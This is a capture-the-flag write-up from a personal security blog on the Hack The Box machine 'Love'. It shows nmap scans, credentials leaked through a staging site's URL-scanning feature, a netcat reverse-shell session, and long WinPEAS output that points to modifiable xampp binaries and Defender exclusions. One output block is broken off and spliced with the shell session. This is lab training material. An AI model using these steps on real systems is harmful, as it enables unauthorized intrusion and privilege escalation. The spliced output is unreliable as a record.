[**slyone999’s Security Blog**] (https://slyone999.github.io)

[//]: # (# -- 5 spaces before)
[//]: # (## -- 4 spaces before)
[//]: # (### -- 3 spaces before)
[//]: # (#### -- 2 spaces before)
[//]: # (##### -- 1 space before)

* TOC
{:toc}

# Info#

| Machine Name | Love |
| IP Address | 10.10.10.239 |
| OS | Windows |

# Recon

## NMap

nmap -p 1-65535 -T4 -A -v 10.10.10.239

```
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-10 20:52 BST
NSE: Loaded 153 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 20:52
Completed NSE at 20:52, 0.00s elapsed
Initiating NSE at 20:52
Completed NSE at 20:52, 0.00s elapsed
Initiating NSE at 20:52
Completed NSE at 20:52, 0.00s elapsed
Initiating Ping Scan at 20:52
Scanning 10.10.10.239 [2 ports]
Completed Ping Scan at 20:52, 0.07s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 20:52
Completed Parallel DNS resolution of 1 host. at 20:52, 0.00s elapsed
Initiating Connect Scan at 20:52
Scanning 10.10.10.239 [65535 ports]
Discovered open port 443/tcp on 10.10.10.239
Discovered open port 139/tcp on 10.10.10.239
Discovered open port 80/tcp on 10.10.10.239
Discovered open port 3306/tcp on 10.10.10.239
Discovered open port 135/tcp on 10.10.10.239
Discovered open port 445/tcp on 10.10.10.239
Discovered open port 49670/tcp on 10.10.10.239
Discovered open port 5986/tcp on 10.10.10.239
Discovered open port 49669/tcp on 10.10.10.239
Discovered open port 5000/tcp on 10.10.10.239
Discovered open port 49668/tcp on 10.10.10.239
Discovered open port 49664/tcp on 10.10.10.239
Discovered open port 5985/tcp on 10.10.10.239
Discovered open port 49665/tcp on 10.10.10.239
Discovered open port 5040/tcp on 10.10.10.239
Discovered open port 47001/tcp on 10.10.10.239
Discovered open port 7680/tcp on 10.10.10.239
Discovered open port 49666/tcp on 10.10.10.239
Discovered open port 49667/tcp on 10.10.10.239
Completed Connect Scan at 20:52, 52.91s elapsed (65535 total ports)
Initiating Service scan at 20:52
Scanning 19 services on 10.10.10.239
Service scan Timing: About 57.89% done; ETC: 20:54 (0:00:31 remaining)
Completed Service scan at 20:55, 157.39s elapsed (19 services on 1 host)
NSE: Script scanning 10.10.10.239.
Initiating NSE at 20:55
Completed NSE at 20:55, 16.03s elapsed
Initiating NSE at 20:55
Completed NSE at 20:55, 1.23s elapsed
Initiating NSE at 20:55
Completed NSE at 20:55, 0.01s elapsed
Nmap scan report for 10.10.10.239
Host is up (0.041s latency).
Not shown: 65516 closed ports
PORT      STATE SERVICE      VERSION
80/tcp    open  http         Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
|_http-title: Voting System using PHP
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
443/tcp   open  ssl/http     Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
|_http-title: 403 Forbidden
| ssl-cert: Subject: commonName=staging.love.htb/organizationName=ValentineCorp/stateOrProvinceName=m/countryName=in
| Issuer: commonName=staging.love.htb/organizationName=ValentineCorp/stateOrProvinceName=m/countryName=in
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-01-18T14:00:16
| Not valid after:  2022-01-18T14:00:16
| MD5:   bff0 1add 5048 afc8 b3cf 7140 6e68 5ff6
|_SHA-1: 83ed 29c4 70f6 4036 a6f4 2d4d 4cf6 18a2 e9e4 96c2
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
445/tcp   open  microsoft-ds Windows 10 Pro 19042 microsoft-ds (workgroup: WORKGROUP)
3306/tcp  open  mysql?
| fingerprint-strings: 
|   NCP, NULL: 
|_    Host '10.10.14.21' is not allowed to connect to this MariaDB server
5000/tcp  open  http         Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
|_http-title: 403 Forbidden
5040/tcp  open  unknown
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
5986/tcp  open  ssl/http     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
| ssl-cert: Subject: commonName=LOVE
| Subject Alternative Name: DNS:LOVE, DNS:Love
| Issuer: commonName=LOVE
| Public Key type: rsa
| Public Key bits: 4096
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-04-11T14:39:19
| Not valid after:  2024-04-10T14:39:19
| MD5:   d35a 2ba6 8ef4 7568 f99d d6f4 aaa2 03b5
|_SHA-1: 84ef d922 a70a 6d9d 82b8 5bb3 d04f 066b 12f8 6e73
|_ssl-date: 2021-06-10T20:25:15+00:00; +29m27s from scanner time.
| tls-alpn: 
|_  http/1.1
7680/tcp  open  pando-pub?
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49668/tcp open  msrpc        Microsoft Windows RPC
49669/tcp open  msrpc        Microsoft Windows RPC
49670/tcp open  msrpc        Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3306-TCP:V=7.91%I=7%D=6/10%Time=60C26D96%P=x86_64-pc-linux-gnu%r(NU
SF:LL,4A,"F\0\0\x01\xffj\x04Host\x20'10\.10\.14\.21'\x20is\x20not\x20allow
SF:ed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(NCP,4A,"F\0\
SF:0\x01\xffj\x04Host\x20'10\.10\.14\.21'\x20is\x20not\x20allowed\x20to\x2
SF:0connect\x20to\x20this\x20MariaDB\x20server");
Service Info: Hosts: www.example.com, LOVE, www.love.htb; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h14m28s, deviation: 3h30m02s, median: 29m26s
| smb-os-discovery: 
|   OS: Windows 10 Pro 19042 (Windows 10 Pro 6.3)
|   OS CPE: cpe:/o:microsoft:windows_10::-
|   Computer name: Love
|   NetBIOS computer name: LOVE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2021-06-10T13:25:04-07:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-06-10T20:25:02
|_  start_date: N/A

NSE: Script Post-scanning.
Initiating NSE at 20:55
Completed NSE at 20:55, 0.00s elapsed
Initiating NSE at 20:55
Completed NSE at 20:55, 0.00s elapsed
Initiating NSE at 20:55
Completed NSE at 20:55, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 228.47 seconds
```


### Port 80

gobuster dir -u http://10.10.10.239 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50

This doesnt return anything

The machine appears to have multiple names 

love
love.htb
staging.love.htb

Trying to access the names on the different ports provides diffeent responses 

After lots of checking staging.love.htb:5000 has a page to demo the scannign feature and different file and urls can be tested.
Most urls don't work but http://love:5000 returns a password

username: admin
password: @LoveIsInTheAir!!!!

Where is this going to be used. 

If you use http://10.10.10.239/admin and login you get into a system.



## Winpeas
winpeas.bat

            ((,.,/((((((((((((((((((((/,  */
     ,/*,..*(((((((((((((((((((((((((((((((((,
   ,*/((((((((((((((((((/,  .*//((//**, .*((((((*
   ((((((((((((((((* *****,,,/########## .(* ,((((((
   (((((((((((/* ******************/####### .(. ((((((
   ((((((..******************/@@@@@/***/###### /((((((
   ,,..**********************@@@@@@@@@@(***,#### ../(((((
   , ,**********************#@@@@@#@@@@*********##((/ /((((
   ..(((##########*********/#@@@@@@@@@/*************,,..((((
   .(((################(/******/@@@@@#****************.. /((
   .((########################(/************************..*(
   .((#############################(/********************.,(
   .((##################################(/***************..(
   .((######################################(************..(
   .((######(,.***.,(###################(..***(/*********..(
   .((######*(#####((##################((######/(********..(
   .((##################(/**********(################(**...(
   .(((####################/*******(###################.((((
   .(((((############################################/  /((
   ..(((((#########################################(..(((((.
   ....(((((#####################################( .((((((.
   ......(((((#################################( .(((((((.
   (((((((((. ,(############################(../(((((((((.
       (((((((((/,  ,####################(/..((((((((((.
             (((((((((/,.  ,*//////*,. ./(((((((((((.
                (((((((((((((((((((((((((((/
                       by carlospolop


/!\ Advisory: WinPEAS - Windows local Privilege Escalation Awesome Script
   WinPEAS should be used for authorized penetration testing and/or educational purposes only.
   Any misuse of this software will not be the responsibility of the author or of any other collaborator.
   Use it at your own networks and/or with the network owner's permission.

[*] BASIC SYSTEM INFO
 [+] WINDOWS OS
   [i] Check for vulnerabilities for the OS version with the applied patches
   [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#kernel-exploits

Host Name:                 LOVE
OS Name:                   Microsoft Windows 10 Pro
OS Version:                10.0.19042 N/A Build 19042
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Workstation
OS Build Type:             Multiprocessor Free
Registered Owner:          roy
Registered Organization:   
Product ID:                00330-80112-18556-AA148
Original Install Date:     4/12/2021, 1:14:12 PM
System Boot Time:          6/14/2021, 11:34:54 AM
System Manufacturer:       VMware, Inc.
System Model:              VMware7,1
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
BIOS Version:              VMware, Inc. VMW71.00V.13989454.B64.1906190538, 6/19/2019
Windows Directory:         C:\WINDOWS
System Directory:          C:\WINDOWS\system32
Boot Device:               \Device\HarddiskVolume3
System Locale:             ┌─[user@parrot-virtual]─[~/Desktop]
└──╼ $nc -lvnp 8888
listening on [any] 8888 ...
connect to [10.10.14.21] from (UNKNOWN) [10.10.10.239] 62153
SOCKET: Shell has connected! PID: 5972
Microsoft Windows [Version 10.0.19042.867]
(c) 2020 Microsoft Corporation. All rights reserved.

C:\>winpeas.bat /?
'winpeas.bat' is not recognized as an internal or external command,
operable program or batch file.

C:\>cd temp

C:\temp>winpeas //

            ((,.,/((((((((((((((((((((/,  */
     ,/*,..*(((((((((((((((((((((((((((((((((,
   ,*/((((((((((((((((((/,  .*//((//**, .*((((((*
   ((((((((((((((((* *****,,,/########## .(* ,((((((
   (((((((((((/* ******************/####### .(. ((((((
   ((((((..******************/@@@@@/***/###### /((((((
   ,,..**********************@@@@@@@@@@(***,#### ../(((((
   , ,**********************#@@@@@#@@@@*********##((/ /((((
   ..(((##########*********/#@@@@@@@@@/*************,,..((((
   .(((################(/******/@@@@@#****************.. /((
   .((########################(/************************..*(
   .((#############################(/********************.,(
   .((##################################(/***************..(
   .((######################################(************..(
   .((######(,.***.,(###################(..***(/*********..(
   .((######*(#####((##################((######/(********..(
   .((##################(/**********(################(**...(
   .(((####################/*******(###################.((((
   .(((((############################################/  /((
   ..(((((#########################################(..(((((.
   ....(((((#####################################( .((((((.
   ......(((((#################################( .(((((((.
   (((((((((. ,(############################(../(((((((((.
       (((((((((/,  ,####################(/..((((((((((.
             (((((((((/,.  ,*//////*,. ./(((((((((((.
                (((((((((((((((((((((((((((/
                       by carlospolop


/!\ Advisory: WinPEAS - Windows local Privilege Escalation Awesome Script
   WinPEAS should be used for authorized penetration testing and/or educational purposes only.
   Any misuse of this software will not be the responsibility of the author or of any other collaborator.
   Use it at your own networks and/or with the network owner's permission.

[*] BASIC SYSTEM INFO
 [+] WINDOWS OS
   [i] Check for vulnerabilities for the OS version with the applied patches
   [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#kernel-exploits
c
Host Name:                 LOVE
OS Name:                   Microsoft Windows 10 Pro
OS Version:                10.0.19042 N/A Build 19042
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Workstation
OS Build Type:             Multiprocessor Free
Registered Owner:          roy
Registered Organization:   
Product ID:                00330-80112-18556-AA148
Original Install Date:     4/12/2021, 1:14:12 PM
System Boot Time:          6/14/2021, 11:34:54 AM
System Manufacturer:       VMware, Inc.
System Model:              VMware7,1
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
BIOS Version:              VMware, Inc. VMW71.00V.13989454.B64.1906190538, 6/19/2019
Windows Directory:         C:\WINDOWS
System Directory:          C:\WINDOWS\system32
Boot Device:               \Device\HarddiskVolume3
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC-08:00) Pacific Time (US & Canada)
Total Physical Memory:     4,095 MB
Available Physical Memory: 2,641 MB
Virtual Memory: Max Size:  4,799 MB
Virtual Memory: Available: 3,150 MB
Virtual Memory: In Use:    1,649 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              \\LOVE
Hotfix(s):                 9 Hotfix(s) Installed.
                           [01]: KB4601554
                           [02]: KB4562830
                           [03]: KB4570334
                           [04]: KB4577586
                           [05]: KB4580325
                           [06]: KB4586864
                           [07]: KB4589212
                           [08]: KB5000802
                           [09]: KB5000858
Network Card(s):           1 NIC(s) Installed.
                           [01]: vmxnet3 Ethernet Adapter
                                 Connection Name: Ethernet0 2
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.239
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.

Caption                                     Description      HotFixID   InstalledOn  
http://support.microsoft.com/?kbid=4601554  Update           KB4601554  4/12/2021    
https://support.microsoft.com/help/4562830  Update           KB4562830  4/12/2021    
http://support.microsoft.com/?kbid=4570334  Security Update  KB4570334  11/18/2020   
https://support.microsoft.com/help/4577586  Update           KB4577586  4/12/2021    
https://support.microsoft.com/help/4580325  Security Update  KB4580325  11/19/2020   
https://support.microsoft.com/help/4586864  Security Update  KB4586864  11/19/2020   
https://support.microsoft.com/help/4589212  Update           KB4589212  4/12/2021    
https://support.microsoft.com/help/5000802  Security Update  KB5000802  4/12/2021    
                                            Security Update  KB5000858  4/12/2021    



 [+] DATE and TIME
   [i] You may need to adjust your local date/time to exploit some vulnerability
Mon 06/14/2021 
12:49 PM

 [+] Audit Settings
   [i] Check what is being logged


 [+] WEF Settings
   [i] Check where are being sent the logs

 [+] LAPS installed?
   [i] Check what is being logged

 [+] LSA protection?
   [i] Active if "1"


 [+] Credential Guard?
   [i] Active if "1" or "2"

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA
    LsaCfgFlags    REG_DWORD    0x0


 [+] WDigest?
   [i] Plain-text creds in memory if "1"

 [+] Number of cached creds
   [i] You need System-rights to extract them

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
    CACHEDLOGONSCOUNT    REG_SZ    10

 [+] UAC Settings
   [i] If the results read ENABLELUA REG_DWORD 0x1, part or all of the UAC components are on
   [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#basic-uac-bypass-full-file-system-access

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
    EnableLUA    REG_DWORD    0x1


 [+] Registered Anti-Virus(AV)


displayName=Windows Defender




Checking for defender whitelisted PATHS

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths
    C:\Administration    REG_DWORD    0x0
    C:\xampp\htdocs\omrs    REG_DWORD    0x0

 [+] PowerShell settings
PowerShell v2 Version:

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PowerShell\1\PowerShellEngine
    PowerShellVersion    REG_SZ    2.0

PowerShell v5 Version:

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PowerShell\3\PowerShellEngine
    PowerShellVersion    REG_SZ    5.1.19041.1

Transcriptions Settings:
Module logging settings:
Scriptblog logging settings:

PS default transcript history

Checking PS history file
 Volume in drive C has no label.
 Volume Serial Number is 56DE-BA30

 Directory of C:\Users\Phoebe\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine

04/21/2021  06:59 AM                51 ConsoleHost_history.txt
               1 File(s)             51 bytes
               0 Dir(s)   4,045,258,752 bytes free

 [+] MOUNTED DISKS
   [i] Maybe you find something interesting
Caption  
C:       



 [+] ENVIRONMENT
   [i] Interesting information?

ALLUSERSPROFILE=C:\ProgramData
APPDATA=C:\Users\Phoebe\AppData\Roaming
CommonProgramFiles=C:\Program Files\Common Files
CommonProgramFiles(x86)=C:\Program Files (x86)\Common Files
CommonProgramW6432=C:\Program Files\Common Files
COMPUTERNAME=LOVE
ComSpec=C:\WINDOWS\system32\cmd.exe
CurrentLine= 0x1B[33m[+]0x1B[97m ENVIRONMENT
DriverData=C:\Windows\System32\Drivers\DriverData
E=0x1B[
expl=no
HOMEDRIVE=C:
HOMEPATH=\Users\Phoebe
LOCALAPPDATA=C:\Users\Phoebe\AppData\Local
LOGONSERVER=\\LOVE
long=false
NUMBER_OF_PROCESSORS=2
OneDrive=C:\Users\Phoebe\OneDrive
OS=Windows_NT
Path=C:\WINDOWS\system32;C:\WINDOWS;C:\WINDOWS\System32\Wbem;C:\WINDOWS\System32\WindowsPowerShell\v1.0\;C:\WINDOWS\System32\OpenSSH\;C:\Users\Phoebe\AppData\Local\Microsoft\WindowsApps;
PATHEXT=.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC
Percentage=1
PercentageTrack=19
PROCESSOR_ARCHITECTURE=AMD64
PROCESSOR_IDENTIFIER=AMD64 Family 23 Model 1 Stepping 2, AuthenticAMD
PROCESSOR_LEVEL=23
PROCESSOR_REVISION=0102
ProgramData=C:\ProgramData
ProgramFiles=C:\Program Files
ProgramFiles(x86)=C:\Program Files (x86)
ProgramW6432=C:\Program Files
PROMPT=$P$G
PSModulePath=C:\WINDOWS\system32\WindowsPowerShell\v1.0\Modules\
PUBLIC=C:\Users\Public
SESSIONNAME=Console
SystemDrive=C:
SystemRoot=C:\WINDOWS
TEMP=C:\Users\Phoebe\AppData\Local\Temp
TMP=C:\Users\Phoebe\AppData\Local\Temp
USERDOMAIN=LOVE
USERDOMAIN_ROAMINGPROFILE=LOVE
USERNAME=Phoebe
USERPROFILE=C:\Users\Phoebe
windir=C:\WINDOWS
AP_PARENT_PID=6604

 [+] INSTALLED SOFTWARE
   [i] Some weird software? Check for vulnerabilities in unknow software installed
   [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#software

Common Files
Common Files
CUAssistant
Internet Explorer
Internet Explorer
Microsoft
Microsoft Update Health Tools
Microsoft.NET
ModifiableWindowsApps
rempl
VMware
Windows Defender
Windows Defender
Windows Defender Advanced Threat Protection
Windows Mail
Windows Mail
Windows Media Player
Windows Media Player
Windows Multimedia Platform
Windows Multimedia Platform
Windows NT
Windows NT
Windows Photo Viewer
Windows Photo Viewer
Windows Portable Devices
Windows Portable Devices
Windows Security
WindowsPowerShell
WindowsPowerShell
    InstallLocation    REG_SZ    C:\xampp
    InstallLocation    REG_SZ    C:\Program Files\VMware\VMware Tools\
    InstallLocation    REG_SZ    C:\Program Files (x86)\Microsoft\Edge\Application

 [+] Remote Desktop Credentials Manager
   [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#remote-desktop-credential-manager

 [+] WSUS
   [i] You can inject 'fake' updates into non-SSL WSUS traffic (WSUXploit)
   [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#wsus

 [+] RUNNING PROCESSES
   [i] Something unexpected is running? Check for vulnerabilities
   [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#running-processes

Image Name                     PID Services                                    
========================= ======== ============================================
System Idle Process              0 N/A                                         
System                           4 N/A                                         
Registry                        92 N/A                                         
smss.exe                       324 N/A                                         
csrss.exe                      408 N/A                                         
wininit.exe                    516 N/A                                         
csrss.exe                      524 N/A                                         
winlogon.exe                   580 N/A                                         
services.exe                   652 N/A                                         
lsass.exe                      664 KeyIso, SamSs, VaultSvc                     
svchost.exe                    780 BrokerInfrastructure, DcomLaunch, PlugPlay, 
                                   Power, SystemEventsBroker                   
fontdrvhost.exe                800 N/A                                         
fontdrvhost.exe                808 N/A                                         
svchost.exe                    896 RpcEptMapper, RpcSs                         
svchost.exe                    944 LSM                                         
dwm.exe                       1000 N/A                                         
svchost.exe                     64 CryptSvc                                    
svchost.exe                    436 AppIDSvc                                    
svchost.exe                    648 CoreMessagingRegistrar                      
svchost.exe                   1064 NcbService                                  
svchost.exe                   1072 TimeBrokerSvc                               
svchost.exe                   1124 DsmSvc                                      
svchost.exe                   1196 DispBrokerDesktopSvc                        
svchost.exe                   1216 EventLog                                    
svchost.exe                   1288 nsi                                         
svchost.exe                   1340 Dhcp                                        
vm3dservice.exe               1452 vm3dservice                                 
svchost.exe                   1460 Schedule                                    
svchost.exe                   1520 NlaSvc                                      
svchost.exe                   1620 ProfSvc                                     
svchost.exe                   1628 EventSystem                                 
svchost.exe                   1648 SysMain                                     
svchost.exe                   1664 Themes                                      
svchost.exe                   1752 SENS                                        
Memory Compression            1796 N/A                                         
svchost.exe                   1808 AudioEndpointBuilder                        
svchost.exe                   1820 netprofm                                    
svchost.exe                   1848 FontCache                                   
svchost.exe                   1924 Audiosrv                                    
svchost.exe                   2036 SEMgrSvc                                    
svchost.exe                   1308 Dnscache                                    
svchost.exe                   1376 DusmSvc                                     
svchost.exe                   1552 Wcmsvc                                      
svchost.exe                   1876 UserManager                                 
svchost.exe                   2148 ShellHWDetection                            
spoolsv.exe                   2224 Spooler                                     
svchost.exe                   2336 BFE, mpssvc                                 
svchost.exe                   2372 WinHttpAutoProxySvc                         
svchost.exe                   2404 LanmanWorkstation                           
svchost.exe                   2604 IKEEXT                                      
svchost.exe                   2616 LanmanServer                                
svchost.exe                   2628 PolicyAgent                                 
svchost.exe                   2752 DiagTrack                                   
svchost.exe                   2764 DPS                                         
svchost.exe                   2800 Winmgmt                                     
svchost.exe                   2864 Browser                                     
svchost.exe                   2888 TrkWks                                      
VGAuthService.exe             2896 VGAuthService                               
vmtoolsd.exe                  2908 VMTools                                     
svchost.exe                   2916 WpnService                                  
svchost.exe                   2952 iphlpsvc                                    
svchost.exe                   2980 WdiServiceHost                              
dllhost.exe                   3360 COMSysApp                                   
WmiPrvSE.exe                  3500 N/A                                         
msdtc.exe                     3804 MSDTC                                       
svchost.exe                   3980 DoSvc                                       
svchost.exe                   4016 wuauserv                                    
svchost.exe                   3184 RmSvc                                       
sihost.exe                    4328 N/A                                         
svchost.exe                   4360 CDPUserSvc_3b296                            
svchost.exe                   4408 WpnUserService_3b296                        
taskhostw.exe                 4464 N/A                                         
MicrosoftEdgeUpdate.exe       4488 N/A                                         
svchost.exe                   4628 TabletInputService                          
svchost.exe                   4644 TokenBroker                                 
ctfmon.exe                    4728 N/A                                         
svchost.exe                   4884 StateRepository                             
svchost.exe                   4988 CDPSvc                                      
svchost.exe                   5012 StorSvc                                     
explorer.exe                  5396 N/A                                         
svchost.exe                   5592 BITS                                        
svchost.exe                   5628 cbdhsvc_3b296                               
svchost.exe                   5708 SSDPSRV                                     
StartMenuExperienceHost.e     6020 N/A                                         
RuntimeBroker.exe             6136 N/A                                         
SearchApp.exe                 1228 N/A                                         
SearchIndexer.exe             1304 WSearch                                     
RuntimeBroker.exe             5132 N/A                                         
vm3dservice.exe               7100 N/A                                         
vmtoolsd.exe                  7144 N/A                                         
OneDrive.exe                  3820 N/A                                         
svchost.exe                   6564 lmhosts                                     
xampp-control.exe             3768 N/A                                         
httpd.exe                     6604 N/A                                         
mysqld.exe                    6612 N/A                                         
conhost.exe                   7164 N/A                                         
httpd.exe                     1144 N/A                                         
dllhost.exe                   7468 N/A                                         
RuntimeBroker.exe             7564 N/A                                         
ApplicationFrameHost.exe      8012 N/A                                         
WinStore.App.exe              8036 N/A                                         
RuntimeBroker.exe             8172 N/A                                         
SgrmBroker.exe                7680 SgrmBroker                                  
svchost.exe                   3848 UsoSvc                                      
MoUsoCoreWorker.exe           4172 N/A                                         
svchost.exe                   7792 WinRM                                       
svchost.exe                   5760 wscsvc                                      
svchost.exe                   6924 OneSyncSvc_3b296                            
svchost.exe                   7776 LicenseManager                              
YourPhone.exe                 7412 N/A                                         
RuntimeBroker.exe             7960 N/A                                         
svchost.exe                   8084 PcaSvc                                      
SecurityHealthService.exe     2996 SecurityHealthService                       
ShellExperienceHost.exe       7608 N/A                                         
RuntimeBroker.exe             3680 N/A                                         
svchost.exe                   2124 InstallService                              
svchost.exe                   6460 DsSvc                                       
svchost.exe                   8060 W32Time                                     
UserOOBEBroker.exe            4320 N/A                                         
taskhostw.exe                 7944 N/A                                         
svchost.exe                   5520 WbioSrvc                                    
Microsoft.Photos.exe          2116 N/A                                         
RuntimeBroker.exe             7996 N/A                                         
svchost.exe                   4956 ClipSVC                                     
svchost.exe                   7424 WaaSMedicSvc                                
svchost.exe                   8164 wlidsvc                                     
WmiPrvSE.exe                  2672 N/A                                         
TrustedInstaller.exe          7992 TrustedInstaller                            
TiWorker.exe                  2500 N/A                                         
cmd.exe                       5972 N/A                                         
conhost.exe                   7896 N/A                                         
tasklist.exe                  4508 N/A                                         

   [i] Checking file permissions of running processes (File backdooring - maybe the same files start automatically when Administrator logs in)
C:\WINDOWS\Explorer.EXE NT SERVICE\TrustedInstaller:(F)

C:\Windows\SystemApps\Microsoft.Windows.StartMenuExperienceHost_cw5n1h2txyewy\StartMenuExperienceHost.exe NT SERVICE\TrustedInstaller:(F)

C:\Windows\SystemApps\Microsoft.Windows.Search_cw5n1h2txyewy\SearchApp.exe NT SERVICE\TrustedInstaller:(F)

C:\Program Files\VMware\VMware Tools\vmtoolsd.exe BUILTIN\Administrators:(I)(F)

C:\Users\Phoebe\AppData\Local\Microsoft\OneDrive\OneDrive.exe NT AUTHORITY\SYSTEM:(I)(F)
                                                              LOVE\Phoebe:(I)(F)

C:\xampp\xampp-control.exe BUILTIN\Administrators:(I)(F)
                           NT AUTHORITY\Authenticated Users:(I)(M)

c:\xampp\apache\bin\httpd.exe BUILTIN\Administrators:(I)(F)
                              NT AUTHORITY\Authenticated Users:(I)(M)

c:\xampp\mysql\bin\mysqld.exe BUILTIN\Administrators:(I)(F)
                              NT AUTHORITY\Authenticated Users:(I)(M)

C:\xampp\apache\bin\httpd.exe BUILTIN\Administrators:(I)(F)
                              NT AUTHORITY\Authenticated Users:(I)(M)

C:\Program Files\WindowsApps\Microsoft.WindowsStore_11910.1002.5.0_x64__8wekyb3d8bbwe\WinStore.App.exe BUILTIN\Users:(I)(Rc,S,RD,REA,X,RA)

C:\Program Files\WindowsApps\Microsoft.YourPhone_1.21022.168.0_x64__8wekyb3d8bbwe\YourPhone.exe BUILTIN\Users:(I)(Rc,S,RD,REA,X,RA)

C:\Windows\SystemApps\ShellExperienceHost_cw5n1h2txyewy\ShellExperienceHost.exe NT SERVICE\TrustedInstaller:(F)

C:\Program Files\WindowsApps\Microsoft.Windows.Photos_2020.20120.4004.0_x64__8wekyb3d8bbwe\Microsoft.Photos.exe BUILTIN\Users:(I)(Rc,S,RD,REA,X,RA)


   [i] Checking directory permissions of running processes (DLL injection)
C:\Windows\ NT SERVICE\TrustedInstaller:(F)

C:\Windows\SystemApps\Microsoft.Windows.StartMenuExperienceHost_cw5n1h2txyewy\ NT SERVICE\TrustedInstaller:(F)

C:\Windows\SystemApps\Microsoft.Windows.Search_cw5n1h2txyewy\ NT SERVICE\TrustedInstaller:(F)

C:\Program Files\VMware\VMware Tools\ BUILTIN\Administrators:(OI)(CI)(F)

C:\Users\Phoebe\AppData\Local\Microsoft\OneDrive\ NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
                                                  LOVE\Phoebe:(I)(OI)(CI)(F)

C:\xampp\ BUILTIN\Administrators:(I)(OI)(CI)(F)
          NT AUTHORITY\Authenticated Users:(I)(M)
          NT AUTHORITY\Authenticated Users:(I)(OI)(CI)(IO)(M)

c:\xampp\apache\bin\ BUILTIN\Administrators:(I)(OI)(CI)(F)
                     NT AUTHORITY\Authenticated Users:(I)(M)
                     NT AUTHORITY\Authenticated Users:(I)(OI)(CI)(IO)(M)

c:\xampp\mysql\bin\ BUILTIN\Administrators:(I)(OI)(CI)(F)
                    NT AUTHORITY\Authenticated Users:(I)(M)
                    NT AUTHORITY\Authenticated Users:(I)(OI)(CI)(IO)(M)

C:\xampp\apache\bin\ BUILTIN\Administrators:(I)(OI)(CI)(F)
                     NT AUTHORITY\Authenticated Users:(I)(M)
                     NT AUTHORITY\Authenticated Users:(I)(OI)(CI)(IO)(M)

C:\Program Files\WindowsApps\Microsoft.WindowsStore_11910.1002.5.0_x64__8wekyb3d8bbwe\ BUILTIN\Users:(OI)(CI)(Rc,S,RD,REA,X,RA)

C:\Program Files\WindowsApps\Microsoft.YourPhone_1.21022.168.0_x64__8wekyb3d8bbwe\ BUILTIN\Users:(OI)(CI)(Rc,S,RD,REA,X,RA)

